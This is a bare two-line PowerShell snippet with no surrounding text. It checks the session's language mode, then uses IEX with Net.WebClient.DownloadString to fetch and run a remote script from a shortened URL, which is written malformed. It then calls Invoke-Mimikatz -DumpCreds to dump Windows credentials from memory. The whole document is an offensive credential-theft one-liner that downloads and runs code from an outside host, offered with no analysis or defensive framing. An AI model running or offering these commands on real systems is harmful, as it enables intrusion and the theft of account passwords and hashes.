$ExecutionContext.SessionState.LanguageMode

IEX (New-Object Net.WebClient).DownloadString('http://is.gd.oeoFuI'); Invoke-Mimikatz -DumpCreds